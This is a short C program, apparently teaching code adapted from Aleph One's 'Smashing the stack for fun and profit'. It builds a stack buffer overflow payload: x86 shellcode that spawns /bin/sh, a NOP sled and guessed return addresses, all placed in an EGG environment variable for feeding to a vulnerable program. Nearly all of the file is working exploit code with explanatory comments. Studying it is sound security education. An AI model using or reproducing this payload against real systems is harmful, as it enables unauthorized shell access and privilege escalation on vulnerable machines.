/*
 * Example program to create an "egg" to perform a buffer
 * overflow attack
 *
 * This program is a rip off from the paper
 * "Smashing the stack for fun and profit" from Aleph One
 *
 */

#include <stdlib.h>

/* Default offset (usually it won't work) */
#define OFFSET 0
/* Size of the overlowing buffer */
#define BSIZE 612 /* > 512 */

#define NOP 0x90

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

/* Returns the stack pointer */
unsigned long get_sp(void) 
{
  __asm__("movl %esp,%eax");
}

int main(int argc, char *argv[]) 
{
  char *buff, *ptr;
  long *addr_ptr, addr;
  int i, offset=OFFSET;

  /* If an arg is passed, it is the offset */
  if (argv[1] != NULL) offset = atoi(argv[1]);

  /* Creates the attack buffer */
  buff = malloc(BSIZE);

  /* Gets the stack pointer and subtract the offset.
     This is the address that will overwrite the legitimate
     return address */
  addr = get_sp() - offset;
  printf("Using address: 0x%x\n", addr);

  /* Fills in the buffer with the right data */
  addr_ptr = (long *) buff;

  /* First it fills the buffer with the return address
     computed above */
  for (i = 0; i < BSIZE; i+=4)
    *(addr_ptr++) = addr;

  /* Then it fills the first half of the buffer with the
     NOP sled */
  for (i = 0; i < BSIZE/2; i++)
    buff[i] = NOP;

  /* Finally it copies the shell code in the middle */
  ptr = buff + ((BSIZE/2) - (strlen(shellcode)/2));
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  /* Adds the final zero byte */
  buff[BSIZE - 1] = '\0';

  /* Puts the "egg" in an environment variable */
  memcpy(buff,"EGG=",4);
  putenv(buff);

  /* Invokes a shell (with the correct environment) */
  system("/bin/bash");

  /* After this the variable $EGG will be passed as the
     overflowing parameter to the program 

     % vulnerable $EGG
     $

  */
}





